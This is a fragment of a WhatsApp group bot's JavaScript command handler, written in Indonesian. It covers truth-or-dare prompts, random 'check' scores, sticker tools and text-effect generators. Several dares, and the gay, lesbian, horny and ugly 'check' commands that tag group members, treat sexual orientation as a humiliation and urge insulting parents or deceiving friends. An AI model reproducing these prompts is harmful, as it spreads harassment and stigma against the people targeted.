"Tulis 'Aku mencintaimu (nama anggota grup acak yang sedang online) dalam percakapan pribadi (jika kamu pria, tulis nama wanita; jika kamu wanita, tulis nama pria), ambil tangkapan layar dan kirimkan di sini",
"Gunakan foto aktor Bollywood sebagai foto profilmu selama 3 hari",
"Jadikan foto crushmu sebagai status dengan caption 'Ini adalah crushku'",
"Ubah nama menjadi *I AM GAY* selama 5 jam",
"Obrol dengan salah satu kontak di WhatsApp dan katakan 'Aku akan menjadi pacarmu selama 5 jam'",
"Kirim pesan suara dan katakan 'Aku naksir kamu, maukah kamu menjadi pacarku?' kepada orang acak dari grup (jika kamu perempuan, pilih nama laki-laki; jika kamu laki-laki, pilih nama perempuan)",
"Pukul pantatmu dengan keras dan kirim suara tamparan melalui pesan suara 😂",
"Sebutkan tipe pacarmu dan kirim fotonya di sini dengan keterangan 'Perempuan/laki-laki paling jelek di dunia'",
"Teriak 'bravooooooooo' dan kirimkan melalui pesan suara di sini",
"Ambil foto wajahmu dan kirim di sini",
"Kirim foto dirimu dengan keterangan 'Aku lesbian'",
"Teriak dengan menggunakan kata-kata kasar dan kirim melalui pesan suara",
"Teriak 'kamu bajingan' di depan ibu atau ayahmu",
"Ubah nama menjadi *aku bodoh selama 24 jam*",
"Pukul dirimu sendiri dengan mantap dan kirim suara pukulan melalui pesan suara 😂",
"Ucapkan 'aku cinta pemilik bot Dinz' melalui pesan suara",
"Kirim foto pacar atau gebetanmu di sini",
"Buat video tantangan tarian TikTok apa pun dan unggah sebagai status, kamu bisa menghapusnya setelah 5 jam",
"Putuskan pertemanan dengan sahabatmu selama 5 jam tanpa memberitahunya bahwa itu adalah tantangan",
"Katakan pada salah satu temanmu bahwa kamu mencintainya dan ingin menikahinya, tanpa memberitahunya bahwa itu adalah tantangan",
"Ucapkan 'aku cinta Depak Kalal' melalui pesan suara",
"Tulis 'aku merasa horny' dan unggah sebagai status, kamu hanya bisa menghapusnya setelah 5 jam",
"Tulis 'aku lesbian' dan unggah sebagai status, kamu hanya bisa menghapusnya setelah 5 jam",
"Cium ibu atau ayahmu dan katakan 'aku mencintaimu' 😌",
"Jadikan nama ayahmu sebagai status selama 5 jam",
"Kirim kata-kata kasar dalam grup manapun, kecuali grup ini, dan kirim bukti tangkapan layarnya di sini"
]
              const xeondare = dare[Math.floor(Math.random() * dare.length)]
              bufferdare = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
              TradzSigma.sendMessage(from, { image: bufferdare, caption: '_You choose DARE_\n'+ xeondare }, {quoted:m})
              break
        break
       case 'truth':
              const truth =[
"Pernahkah kamu menyukai seseorang? Berapa lama?",
    "Jika kamu bisa atau jika kamu mau, grup obrolan atau grup di luar mana yang ingin kamu jadikan teman? (bisa berbeda/jenis yang sama)",
    "Apa ketakutan terbesar kamu?",
    "Pernahkah kamu menyukai seseorang dan merasa bahwa orang tersebut juga menyukaimu?",
    "Siapa nama mantan pacar temanmu yang dulu pernah kamu sukai diam-diam?",
    "Pernahkah kamu mengambil uang dari ayah atau ibumu? Alasannya?",
    "Apa yang membuatmu bahagia saat sedang sedih?",
    "Pernahkah kamu memiliki perasaan cinta satu arah? jika ya kepada siapa? bagaimana perasaannya, bro?",
    "Pernah menjadi selingkuhan seseorang?",
    "Hal paling ditakuti?",
    "Siapa orang yang paling berpengaruh dalam hidupmu?",
    "Prestasi apa yang berhasil kamu raih tahun ini?",
    "Siapa orang yang bisa membuatmu keren?",
    "Siapa orang yang pernah membuatmu sangat bahagia?",
    "Siapa yang paling mendekati tipe pasangan idamanmu di sini?",
    "Dengan siapa kamu suka bermain?",
    "Pernahkah kamu menolak seseorang? alasan mengapa?",
    "Sebutkan insiden yang pernah menyakiti perasaanmu yang masih kamu ingat",
    "Prestasi apa yang sudah kamu capai tahun ini?",
    "Kebiasaan terburukmu di sekolah?",
    "Lagu apa yang paling sering kamu nyanyikan di dalam kamar mandi?",
    "Pernahkah kamu mengalami pengalaman dekat dengan kematian?",
    "Kapan terakhir kali kamu sangat marah? Mengapa?",
    "Siapa orang terakhir yang meneleponmu?",
    "Apakah kamu memiliki bakat tersembunyi? Apa sajakah itu?",
    "Kata apa yang paling kamu benci?",
    "Video YouTube terakhir apa yang kamu tonton?",
    "Hal terakhir apa yang kamu cari di Google?",
    "Dalam grup ini, dengan siapa yang ingin kamu tukar kehidupan selama seminggu?",
    "Apa hal paling menakutkan yang pernah terjadi padamu?",
    "Pernahkah kamu kentut dan menyalahkannya kepada orang lain?",
    "Kapan terakhir kali kamu membuat orang lain menangis?",
    "Pernahkah kamu menghilangkan jejak dari seorang teman?",
    "Pernahkah kamu melihat mayat?",
    "Anggota keluargamu yang paling mengganggumu dan mengapa?",
    "Jika kamu harus menghapus satu aplikasi dari ponselmu, aplikasi mana yang akan kamu hapus?",
    "Aplikasi apa yang paling sering kamu buang-buang waktu di dalamnya?",
    "Pernahkah kamu berpura-pura sakit untuk pulang dari sekolah?",
    "Apa barang paling memalukan di dalam kamar kamarmu?",
    "Jika terdampar di pulau terpencil, lima barang apa yang akan kamu bawa?",
    "Pernahkah kamu tertawa begitu keras hingga pipismu basah?",
    "Apakah kamu mencium bau kentutmu sendiri?",
    "Pernahkah kamu kencing di tempat tidur saat tidur?",
    "Apa kesalahan terbesar yang pernah kamu buat?",
    "Pernahkah kamu mencontek dalam ujian?",
    "Apa hal terburuk yang pernah kamu lakukan?",
    "Kapan terakhir kali kamu menangis?",
    "Di antara orang tua kamu, siapa yang kamu cintai paling?",
    "Apakah kamu kadang-kadang memasukkan jari ke dalam lubang hidungmu?",
    "Siapa pujaan hati kamu saat masa sekolah dulu?",
    "Berbicara jujur, apakah kamu menyukai seorang anak laki-laki dalam grup ini?",
    "Pernahkah kamu menyukai seseorang? Berapa lama?",
    "Apakah kamu punya pacar? Apa ketakutan terbesarmu?",
    "Pernahkah kamu menyukai seseorang dan merasa bahwa orang tersebut juga menyukaimu?",
    "Siapa nama mantan pacar temanmu yang pernah kamu sukai diam-diam?",
    "Pernahkah kamu mengambil uang milik ibu atau ayahmu? Apa alasannya?",
    "Apa yang membuatmu bahagia saat sedang sedih?",
    "Apakah kamu menyukai seseorang dalam grup ini? Jika ya, siapa?",
    "Pernahkah kamu ditipu oleh seseorang?",
    "Siapa orang yang paling penting dalam hidupmu?",
    "Prestasi apa yang telah kamu capai tahun ini?",
    "Siapa orang yang bisa membuatmu bahagia saat sedang sedih?",
    "Siapa orang yang pernah membuatmu merasa tidak nyaman?",
    "Pernahkah kamu berbohong kepada orang tua?",
    "Apakah kamu masih menyukai mantan pacarmu?",
    "Siapa yang ingin kamu ajak bermain bersama?",
    "Pernahkah kamu mencuri sesuatu yang besar? Alasannya apa?",
    "Sebutkan insiden yang pernah membuatmu terluka dan masih kamu ingat?",
    "Prestasi apa yang sudah kamu raih tahun ini?",
    "Apa kebiasaan terburukmu saat di sekolah?",
    "Apakah kamu mencintai pencipta bot ini, Dani 😄",
    "Pernahkah kamu berpikir untuk membalas dendam pada guru?",
    "Apakah kamu menyukai perdana menteri saat ini di negaramu?",
    "Apakah kamu vegetarian atau non-vegetarian?",
    "Jika kamu bisa menjadi tak terlihat, apa yang pertama kali akan kamu lakukan?",
    "Apa rahasia yang kamu simpan dari orang tua kamu?",
    "Siapa pujaan hati rahasiamu?",
    "Siapa orang terakhir yang kamu intip di media sosial?",
    "Jika seorang jin memberimu tiga permintaan, apa yang akan kamu minta?",
    "Apa penyesalan terbesarmu?",
    "Hewan seperti apa menurutmu yang paling mirip denganmu?",
    "Berapa banyak foto selfie yang kamu ambil dalam sehari?",
    "Apa acara favoritmu saat masa kanak-kanak?",
    "Jika kamu bisa menjadi karakter fiksi dalam satu hari, siapa yang akan kamu pilih?",
    "Dengan siapa kamu paling sering mengirim pesan?",
    "Apa kebohongan terbesar yang pernah kamu ceritakan kepada orang tua kamu?",
    "Siapa selebriti yang menjadi pujaan hatimu?",
    "Mimpi paling aneh yang pernah kamu alami?",
    "Apakah kamu bermain PUBG? Jika ya, berikan nomor ID-mu."
]
              const DinzIDtruth = truth[Math.floor(Math.random() * truth.length)]
              buffertruth = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
              TradzSigma.sendMessage(from, { image: buffertruth, caption: '_You choose TRUTH_\n'+ DinzIDtruth }, {quoted:m})
              break
case 'checkme':
					neme = args.join(" ")
					bet = `${sender}`
					var sifat = ["Baik", "Tidak ramah", "Chapri", "Nibba/nibbi", "Mengganggu", "Rusak", "Orang marah", "Sopan", "Beban", "Hebat", "Cringe", "Pembohong"]
					var hoby = ['Memasak','Menari','Bermain','Bermain game','Melukis','Membantu Orang Lain','Menonton anime','Membaca','Bersepeda','Bernyanyi','Berbincang-bincang','Berbagi Meme','Menggambar','Menghabiskan Uang Orang Tua','Bermain Truth or Dare','Menghabiskan Waktu Sendirian']
					var bukcin = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var arp = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var cakep = ['Ya', 'Tidak', 'Sangat jelek', 'Sangat tampan']
					var wetak= ['Peduli','Murah hati','Orang marah','Maaf','Tunduk','Baik','Maafkan aku','Berhati baik','Sabar','UwU','Terbaik','Membantu']
					var baikk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var bhuruk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var cerdhas = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var berhani = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var mengheikan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var sipat = sifat[Math.floor(Math.random() * sifat.length)]
					var biho = hoby[Math.floor(Math.random() * hoby.length)]
					var bhucin = bukcin[Math.floor(Math.random() * bukcin.length)]
					var senga = arp[Math.floor(Math.random() * arp.length)]
					var chakep = cakep[Math.floor(Math.random() * cakep.length)]
					var watak = wetak[Math.floor(Math.random() * wetak.length)]
					var baik = baikk[Math.floor(Math.random() * baikk.length)]
					var burug = bhuruk[Math.floor(Math.random() * bhuruk.length)]
					var cerdas = cerdhas[Math.floor(Math.random() * cerdhas.length)]
					var berani = berhani[Math.floor(Math.random() * berhani.length)]
					var takut = mengheikan[Math.floor(Math.random() * mengheikan.length)]
					 profile = `*≡══《 Check @${bet.split('@')[0]} 》══≡*

*Name :* ${pushname}
*karakteristik :* ${sipat}
*Hobby :* ${biho}
*bucin :* ${bhucin}%
*Great :* ${senga}%
*Ganteng :* ${chakep}
*Character :* ${watak}
*Moral Baik :* ${baik}%
*Morals Buruk :* ${burug}%
*Kecerdasan :* ${cerdas}%
*Keberanian :* ${berani}%
*Penakut :* ${takut}%

*≡═══《 CHECK PROPERTIES 》═══≡*`
					buff = await getBuffer(defaultpp)
TradzSigma.sendMessage(from, { image: buff, caption: profile, mentions: [bet]},{quoted:m})
break
case 'toimg': {
	TradzSigma.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
	const getRandom = (ext) => {
            return `${Math.floor(Math.random() * 10000)}${ext}`
        }
        if (!m.quoted) return replyviex(`_Reply to Any Sticker._`)
        let mime = m.quoted.mtype
if (mime =="imageMessage" || mime =="stickerMessage")
{
        let media = await TradzSigma.downloadAndSaveMediaMessage(m.quoted)
        let name = await getRandom('.png')
        exec(`ffmpeg -i ${media} ${name}`, (err) => {
        	fs.unlinkSync(media)
            let buffer = fs.readFileSync(name)
            TradzSigma.sendMessage(m.chat, { image: buffer }, { quoted: m })      
fs.unlinkSync(name)
        })
        
} else return replyviex(`Please reply to non animated sticker`)
    }
    break
case 'swm': case 'steal': case 'stickerwm': case 'take': case 'wm': {
  const getRandom = (ext) => {
            return `${Math.floor(Math.random() * 10000)}${ext}`
        }
	let ahuh = args.join(' ').split('|')
	let satu = ahuh[0] !== '' ? ahuh[0] : `yoy`
	let dua = typeof ahuh[1] !== 'undefined' ? ahuh[1] : ``
	let { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter')
	let media = await TradzSigma.downloadAndSaveMediaMessage(quoted)
	let jancok = new Sticker(media, {
	pack: satu, // The pack name
	author: dua, // The author name
	type: StickerTypes.FULL, // The sticker type
	categories: ['🤩', '🎉'], // The sticker category
	id: '12345', // The sticker id
	quality: 70, // The quality of the output file
	background: '#FFFFFF00' // The sticker background color (only for full stickers)
	})
	let stok = getRandom(".webp")
	let nono = await jancok.toFile(stok)
	let nah = fs.readFileSync(nono)
	await TradzSigma.sendMessage(from,{sticker: nah},{quoted: m})
	await fs.unlinkSync(stok)
	await fs.unlinkSync(media)
}
	break

case 'delsampah':{
	let path = require('path');
	let directoryPath = path.join();
	fs.readdir(directoryPath, async function (err, files) {
	if (err) {
	console.log('Unable to scan directory: ' + err);
	return reply('Unable to scan directory: ' + err);
	 } 
	let filteredArray = await files.filter(item => item.endsWith("gif") || item.endsWith("png") || item.endsWith("mp3")  || item.endsWith("mp4") || item.endsWith("jpg") ||item.endsWith("webp") ||item.endsWith("webm") || item.endsWith("opus") || item.endsWith("jpeg"))
	console.log(filteredArray.length); 
	let teks =`Terdeteksi ${filteredArray.length} file Kenangan <3\n\n`
	if(filteredArray.length == 0) return reply(`${teks}`)
	filteredArray.map(function(e, i){
	teks += (i+1)+`. ${e}\n`
	})
	 
	reply(`${teks}`)
	
//	await sleep(2000)
	reply("Menghapus file Kenangan...")
	await filteredArray.forEach(function (file) {
	fs.unlinkSync(file)
	});
	//await sleep(2000)
	reply("Berhasil menghapus semua Kenangan <3")
	 
	});
	  }
	break 
	//================================================================================

case "qc5": {
if (!text) return replyviex(example('teksnya'))
let warna = ["#000000", "#ff2414", "#22b4f2", "#eb13f2"]
var ppuser
try {
ppuser = await TradzSigma.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://telegra.ph/file/a059a6a734ed202c879d3.jpg'
}
const json = {
  "type": "quote",
  "format": "png",
  "backgroundColor": "#000000",
  "width": 812,
  "height": 968,
  "scale": 2,
  "messages": [
    {
      "entities": [],
      "avatar": true,
      "from": {
        "id": 1,
        "name": m.pushName,
        "photo": {
          "url": ppuser
        }
      },
      "text": text,
      "replyMessage": {}
    }
  ]
};
        const response = axios.post('https://bot.lyo.su/quote/generate', json, {
        headers: {'Content-Type': 'application/json'}
}).then(async (res) => {
    const buffer = Buffer.from(res.data.result.image, 'base64')
    let tempnya = "./database/rentbot/"+m.sender+".png"
await fs.writeFile(tempnya, buffer, async (err) => {
if (err) return replyviex("Error")
await TradzSigma.sendAsSticker(m.chat, tempnya, m, {packname: global.packname})
await fs.unlinkSync(`${tempnya}`)
})
})
}
break

case "hytam": {
TradzSigma.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
const colorMap = {
  hitam: "#000000", putih: "#ffffff", merah: "#ff0000", biru: "#0000ff", kuning: "#ffff00",
  hijau: "#00ff00", ijo: "#00ff00", ungu: "#800080", pink: "#ffc0cb", oranye: "#ffa500",
  coklat: "#8b4513", abu: "#808080", pink_pastel: "#ffd1dc", cyan: "#00ffff", toska: "#40e0d0",
  lavender: "#e6e6fa", mint: "#98ff98", peach: "#ffcccb", salem: "#fa8072", emas: "#ffd700",
  silver: "#c0c0c0", navy: "#000080", maroon: "#800000", coklat_muda: "#d2b48c",
  biru_muda: "#add8e6", hijau_muda: "#90ee90", kuning_pastel: "#fdfd96", merah_muda: "#ff6961",
  biru_laut: "#4682b4", hijau_lumut: "#556b2f", ungu_muda: "#dda0dd", abu_muda: "#d3d3d3",
  karamel: "#c68e17", hijau_toska: "#20b2aa", biru_langit: "#87ceeb", coklat_tua: "#654321",
  magenta: "#ff00ff", indigo: "#4b0082", krem: "#fffdd0", coklat_kopi: "#4b2e2a",
  plum: "#dda0dd", coral: "#ff7f50", emas_tua: "#b8860b", biru_laut_tua: "#00008b",
  merah_bata: "#8b0000", salmon: "#fa8072", tomato: "#ff6347", merah_anggur: "#800020",
  sienna: "#a0522d", biru_kehijauan: "#5f9ea0", hijau_zamrud: "#50c878", aquamarine: "#7fffd4",
  chartreuse: "#7fff00", lime_green: "#32cd32", perak: "#c0c0c0", teal: "#008080", khaki: "#f0e68c",
  emas_muda: "#ffe4b5", beige: "#f5f5dc", olive: "#808000", merah_cerah: "#ff4500",
  crimson: "#dc143c", fuchsia: "#ff00ff", chocolate: "#d2691e", biru_royal: "#4169e1",
  hijau_gelap: "#006400", merah_jambu: "#ff1493", biru_es: "#e0ffff", kuning_keemasan: "#ffd700",
  jade: "#00a86b", mustard: "#ffdb58", biru_neon: "#4d4dff", aprikot: "#fbceb1",
  biru_beludru: "#483d8b", ungu_gelap: "#4b0082", pastel: "#dbb2ff", hijau_army: "#4b5320",
  pink_flamingo: "#fc74fd", ungu_terong: "#990066", biru_denim: "#1560bd", biru_baja: "#4682b4",
  kelabu_tua: "#a9a9a9", teal_muda: "#afeeee", hijau_daun: "#228b22", lavender_muda: "#e6e6fa",
  oranye_kemerahan: "#ff4500", raspberry: "#e30b5c", biru_langit_terang: "#87cefa",
  biru_arktik: "#00bfff", hijau_pastel: "#77dd77", merah_muda_terang: "#ffb6c1", kuning_neon: "#ccff00",
  emas_metalik: "#d4af37", ungu_lilac: "#c8a2c8", biru_langit_pastel: "#a1caf1", coklat_susu: "#a0522d",
  biru_petir: "#1f75fe", hijau_pistachio: "#93c572", orchid: "#da70d6", biru_pirus: "#40e0d0",
  merah_cherry: "#de3163", kuning_lemon: "#fff44f", orange_terang: "#ffae42", biru_zaitun: "#9ab973"
};
  let bgColor = "#000000";
  await reply('tunggu')
  if (!text) return replyviex("Teksnya mana?");
  if (text.length > 10000) return replyviex("Maximal 10000 karakter!");
  let profilePic = await TradzSigma.profilePictureUrl(m.sender, "image").catch(() => "https://i.ibb.co/3Fh9V6p/avatar-contact.png");
  const payload = {
    type: "quote",
    format: "png",
    backgroundColor: bgColor,
    width: 512,
    height: 768,
    scale: 2,
    messages: [{
      entities: [],
      avatar: true,
      from: { id: 1, name: pushname, photo: { url: profilePic } },
      text: text,
      replyMessage: {}
    }]
  };
  const response = await axios.post("https://quotly.netorare.codes/generate", payload, {
    headers: { "Content-Type": "application/json" }
  });
  const imageBuffer = Buffer.from(response.data.result.image, "base64");
    TradzSigma.sendImageAsSticker(from, imageBuffer, m, { packname: global.namabot, author: global.namabot })
}
//================================================================================
break
case 's':
case 'stiker':
case 'sticker': {
  if (!quoted) return replyviex(`ᴋɪʀɪᴍ ᴀᴛᴀᴜ ʀᴇᴘʟʏ ғᴏᴛᴏ/ᴠɪᴅᴇᴏ/ɢɪғ ᴡɪᴛʜ ᴄᴀᴘᴛɪᴏɴs ${prefix+command}\nᴠɪᴅᴇᴏ ᴅᴜʀᴀsɪ 1-20 ᴅᴇᴛɪᴋ`)
  TradzSigma.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await TradzSigma.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 20) return replyviex('ᴋɪʀɪᴍ ᴀᴛᴀᴜ ʀᴇᴘʟʏ ғᴏᴛᴏ/ᴠɪᴅᴇᴏ/ɢɪғ ᴡɪᴛʜ ᴄᴀᴘᴛɪᴏɴs ${prefix+command}\nᴠɪᴅᴇᴏ ᴅᴜʀᴀsɪ 1-20 ᴅᴇᴛɪᴋ')
TradzSigma.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
let media = await quoted.download()
let encmedia = await TradzSigma.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
} else {
replyviex(`ᴋɪʀɪᴍ ᴀᴛᴀᴜ ʀᴇᴘʟʏ ғᴏᴛᴏ/ᴠɪᴅᴇᴏ/ɢɪғ ᴡɪᴛʜ ᴄᴀᴘᴛɪᴏɴs ${prefix+command}\nᴠɪᴅᴇᴏ ᴅᴜʀᴀsɪ 1-20 ᴅᴇᴛɪᴋ`)
}
}
break
case 'quotes':
const quotexeony = await axios.get(`https://favqs.com/api/qotd`)
        const textquotes = `*${themeemoji} Quote:* ${quotexeony.data.quote.body}\n\n*${themeemoji} Author:* ${quotexeony.data.quote.author}`
return replyviex(textquotes)
break
case 'handsomecheck':
				if (!text) return replyviex(`Tag Someone, Contoh : ${prefix + command} @Xeon`)
					const gan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const teng = gan[Math.floor(Math.random() * gan.length)]
TradzSigma.sendMessage(from, { text: `*${command}*\n\nName : ${q}\nAnswer : *${teng}%*` }, { quoted: m })
					break
case 'beautifulcheck':
				if (!text) return replyviex(`Tag Someone, Contoh : ${prefix + command} @Xeon`)
					const can = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const tik = can[Math.floor(Math.random() * can.length)]
TradzSigma.sendMessage(from, { text: `*${command}*\n\nNama : ${q}\nAnswer : *${tik}%*` }, { quoted: m })
					break
					case 'charactercheck':
					if (!text) return replyviex(`Tag Someone, Contoh : ${prefix + command} @Xeon`)
					const xeony =['Compassionate','Generous','Grumpy','Forgiving','Obedient','Good','Simp','Kind-Hearted','patient','UwU','top, anyway','Helpful']
					const taky = xeony[Math.floor(Math.random() * xeony.length)]
					TradzSigma.sendMessage(from, { text: `Character Check : ${q}\nAnswer : *${taky}*` }, { quoted: m })
				     break
case 'awesomecheck':
  case 'greatcheck':
    case 'gaycheck':
      case 'cutecheck':
        case 'lesbicheck':
          case 'lesbiancheck':
             case 'hornycheck':
 case 'prettycheck':
case 'lovelycheck':
  case 'uglycheck':
if (!m.isGroup) return reply(mess.only.group)
const cex = body.slice(0)
const cek1 = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const cek2 = cek1[Math.floor(Math.random() * cek1.length)]
if (mentionByReply) {
TradzSigma.sendMessage(from, { text: 'Question : *' + cex + '*\nChecker : ' + `@${mentionByReply.split('@')[0]}` + '\nAnswer : ' + cek2 + '%', mentions: [mentionByReply] }, { quoted: m })
} else if (mentionByTag[0] && isGroup) {
TradzSigma.sendMessage(from, { text: 'Question : *' + cex + '*\nChecker : ' + `@${mentionByTag[0].split('@')[0]}` + '\nAnswer : ' + cek2 + '%', mentions: [mentionByTag[0]] }, { quoted: m })
} else if (!mentionByReply && !mentionByTag[0]) {
TradzSigma.sendMessage(from, { text: 'Question : *' + cex + '*\nChecker : ' + `@${sender.split('@')[0]}` + '\nAnswer : ' + cek2 + '%', mentions: [sender] }, { quoted: m })
}
break
case 'obfus': case 'enc': case 'obfuscate':{
if (!q) return replyviex(`Contoh ${prefix+command} const xeonbot = require('baileys')`)
let meg = await obfus(q)
replyviex(`Success
${meg.result}`)
}
break
case 'style': case 'styletext': {
		let { styletext } = require('./lib/scraper')
		if (!text) return replyviex('Enter Query text!')
let anu = await styletext(text)
let teks = `Style Text From ${text}\n\n`
for (let i of anu) {
teks += `${themeemoji} *${i.name}* : ${i.result}\n\n`
}
replyviex(teks)
	    }
	    break
case 'glitchtext':
case 'writetext':
case 'advancedglow':
case 'typographytext':
case 'pixelglitch':
case 'neonglitch':
case 'flagtext':
case 'flag3dtext':
case 'deletingtext':
case 'blackpinkstyle':
case 'glowingtext':
case 'underwatertext':
case 'logomaker':
case 'cartoonstyle':
case 'papercutstyle':
case 'watercolortext':
case 'effectclouds':
case 'blackpinklogo':
case 'gradienttext':
case 'summerbeach':
case 'luxurygold':
case 'multicoloredneon':
case 'sandsummer':
case 'galaxywallpaper':
case '1917style':
case 'makingneon':
case 'royaltext':
case 'freecreate':
case 'galaxystyle':
case 'lighteffects':{

if (!q) return replyviex(`Contoh : ${prefix+command} TradzSigma`) 
TradzSigma.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
let link
if (/glitchtext/.test(command)) link = 'https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html'
if (/writetext/.test(command)) link = 'https://en.ephoto360.com/write-text-on-wet-glass-online-589.html'
if (/advancedglow/.test(command)) link = 'https://en.ephoto360.com/advanced-glow-effects-74.html'
if (/typographytext/.test(command)) link = 'https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html'
if (/pixelglitch/.test(command)) link = 'https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html'
if (/neonglitch/.test(command)) link = 'https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html'
if (/flagtext/.test(command)) link = 'https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html'
if (/flag3dtext/.test(command)) link = 'https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html'
if (/deletingtext/.test(command)) link = 'https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html'
if (/blackpinkstyle/.test(command)) link = 'https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html'
if (/glowingtext/.test(command)) link = 'https://en.ephoto360.com/create-glowing-text-effects-online-706.html'
if (/underwatertext/.test(command)) link = 'https://en.ephoto360.com/3d-underwater-text-effect-online-682.html'
if (/logomaker/.test(command)) link = 'https://en.ephoto360.com/free-bear-logo-maker-online-673.html'
if (/cartoonstyle/.test(command)) link = 'https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html'
if (/papercutstyle/.test(command)) link = 'https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html'
if (/watercolortext/.test(command)) link = 'https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html'
if (/effectclouds/.test(command)) link = 'https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html'
if (/blackpinklogo/.test(command)) link = 'https://en.ephoto360.com/create-blackpink-logo-online-free-607.html'
if (/gradienttext/.test(command)) link = 'https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html'
if (/summerbeach/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html'
if (/luxurygold/.test(command)) link = 'https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html'
if (/multicoloredneon/.test(command)) link = 'https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html'
if (/sandsummer/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html'
if (/galaxywallpaper/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html'
